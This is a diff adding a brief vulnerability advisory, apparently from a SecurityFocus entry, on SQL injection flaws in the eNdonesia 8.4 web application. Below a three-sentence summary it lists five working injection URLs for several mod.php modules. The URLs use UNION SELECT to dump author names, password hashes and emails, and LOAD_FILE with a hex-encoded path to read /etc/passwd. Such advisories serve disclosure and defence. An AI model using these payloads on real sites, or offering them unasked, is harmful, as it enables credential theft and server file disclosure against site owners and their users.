@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/24590/info
+
+eNdonesia is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify sensitive data, or exploit latent vulnerabilities in the underlying database.
+
+eNdonesia 8.4 is vulnerable; other versions may also be affected.
+
+http://www.example.com/mod.php?mod=katalog&op=viewlink&cid=-1+union+select+1,pwd,3+from+authors/*
+http://www.example.com/mod.php?mod=katalog&op=viewlink&cid=-1+union+select+1,LOAD_FILE(0x2F6574632F706173737764),3+from+authors/*
+http://www.example.com/mod.php?mod=diskusi&op=viewdisk&did=-9+union+select+1,2,aid,pwd,5,6,email+from+authors/*
+http://www.example.com/mod.php?mod=publisher&op=viewarticle&cid=2&artid=-9+union+select+1,2,3,4,5,pwd,aid,email,9,0+from+authors/*
+http://www.example.com/mod.php?mod=publisher&op=printarticle&artid=-47+union+select+1,concat_ws%280x3a,aid,name,pwd%29,3,4,5,6,7+from+authors--
+
+
